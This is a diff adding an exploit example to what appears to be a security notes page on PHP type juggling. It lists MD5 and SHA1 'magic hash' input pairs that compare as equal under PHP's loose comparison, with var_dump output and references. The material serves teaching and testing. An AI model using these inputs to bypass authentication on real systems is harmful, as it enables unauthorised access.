@@ -48,3 +48,13 @@ If the hash starts with 0 or 0e and only followed by numbers, then PHP will trea
 
 ### Exploit
 ![Magic Hashes](https://raw.githubusercontent.com/k2decompiler/php-type-juggling/master/Screenshot%20from%202020-01-22%2005-19-20.png)
+```
+var_dump(md5('240610708') == md5('QNKCDZO'));   # bool(true)
+var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));  # bool(true)
+var_dump(sha1('aaroZmOk') == sha1('aaK1STfY')); # bool(true)
+var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m')); # bool(true)
+```
+
+### References
+* [Payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling)
+* [Magic Hashes - WhieHatSec](https://www.whitehatsec.com/blog/magic-hashes/)
